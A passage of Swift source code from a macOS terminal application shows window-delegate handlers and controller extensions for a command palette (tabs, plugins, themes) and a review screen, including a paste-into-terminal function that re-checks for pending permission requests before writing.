    func windowDidBecomeKey(_ notification: Notification) { syncFocus() }
    func windowDidResignKey(_ notification: Notification) { syncFocus() }
    func windowDidChangeScreen(_ notification: Notification) { syncFocus() }
    func windowDidChangeOcclusionState(_ notification: Notification) {
        if window?.occlusionState.contains(.visible) == true { refresh() } else { scheduleTick(in: nil) }
        syncFocus()
    }

    func windowDidResize(_ notification: Notification) {
        guard palette.isOpen, let window else { return }
        palette.position(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop)
    }

    func windowWillClose(_ notification: Notification) {
        ticker?.invalidate()
        ticker = nil
        for t in store.tabs { core.unregisterSurface(surfaceId: t.env.surfaceId) }
        store.removeAll()
    }
}

extension MainWindowController: PaletteHost {
    var paletteTabs: [Row] {
        let order = root.sidebar.orderedIds
        let rows = Dictionary(root.sidebar.snapshot.groups.flatMap(\.rows).map { ($0.surfaceId, $0) }, uniquingKeysWith: { a, _ in a })
        return order.compactMap { rows[$0] }
    }

    var selectedSurfaceId: String? { store.selectedId }

    var palettePlugins: PluginsAPI? { bridge.plugins }

    var pluginLoadErrors: [String] { bridge.loadErrors }

    func paletteSelectTab(_ surfaceId: String) { select(surfaceId) }

    func paletteInvoke(pluginId: String, itemId: String) {
        bridge.invoke(pluginId: pluginId, itemId: itemId, terminalShown: !root.agentsOn && root.review == nil)
    }

    func pluginKey(pluginId: String, id: String, down: Bool) {
        bridge.keyAction(pluginId: pluginId, id: id, down: down, terminalShown: !root.agentsOn && root.review == nil)
    }

    var paletteKeys: KeyMap { config.keys }

    var isFullScreen: Bool { window?.styleMask.contains(.fullScreen) ?? false }

    func paletteRun(_ action: KeyMap.Action) { (NSApp.delegate as? AppDelegate)?.performMenuItem(action) }

    var paletteThemes: [HauntConfig.ThemeChoice] { config.themeChoices() }

    var paletteTheme: String { config.themeName }

    func palettePreviewTheme(_ id: String?) { (NSApp.delegate as? AppDelegate)?.previewTheme(id) }

    func paletteChooseTheme(_ id: String) { (NSApp.delegate as? AppDelegate)?.chooseTheme(id) }

    func paletteDidClose() {
        root.scrim.isHidden = true
        window?.makeKeyAndOrderFront(nil)
        focusSelectedSurface()
    }

    private func focusSelectedSurface() {
        guard let window else { return }
        if let review = root.review {
            window.makeFirstResponder(review)
            return
        }
        if let tab = store.selected { window.makeFirstResponder(tab.view) }
        syncFocus()
    }
}

// MARK: Review screen

extension MainWindowController: ReviewHost {
    var isReviewOn: Bool { reviewer.isOpen }

    func toggleReview() {
        if root.agentsOn { return NSSound.beep() }
        reviewer.toggle()
    }

    var reviewCore: CoreAPI { core }
    var reviewFixture: Fixture? { fixture }
    var reviewWindow: NSWindow? { window }

    var reviewSelection: (surfaceId: String, row: Row?)? {
        guard let id = store.selectedId else { return nil }
        return (id, root.sidebar.snapshot.groups.lazy.flatMap(\.rows).first { $0.surfaceId == id })
    }

    var reviewRows: [Row] { root.sidebar.snapshot.groups.flatMap(\.rows) }

    func showReviewView(_ view: NSView?, coverSidebar: Bool) {
        root.reviewCoversSidebar = coverSidebar
        root.review = view
        root.layoutSubtreeIfNeeded()
        syncFocus()
    }

    private static var savedAccessory: TitleBarView.Accessory?

    func setReviewTitle(crumb: [String], accessory: TitleBarView.Accessory?) {
        root.titleBar.crumb = crumb
        if let accessory {
            if Self.savedAccessory == nil { Self.savedAccessory = root.titleBar.accessory }
            root.titleBar.accessory = accessory
        } else if crumb.isEmpty, let saved = Self.savedAccessory {
            root.titleBar.accessory = saved
            Self.savedAccessory = nil
        }
    }

    func pasteIntoSurface(_ text: String, surfaceId: String) -> Bool {
        // Checked again here, right before the write: a request may have arrived since the send was checked.
        guard store.tab(surfaceId) != nil, !core.hasUnresolved(surfaceId: surfaceId) else { return false }
        // It counts as typing: a pending permission request is retired before the text lands.
        core.onUserInput(surfaceId: surfaceId)
        store.write(Data(text.utf8), to: surfaceId)
        return true
    }

    func selectTab(_ surfaceId: String) { select(surfaceId) }

    func focusTerminal() { focusSelectedSurface() }
}
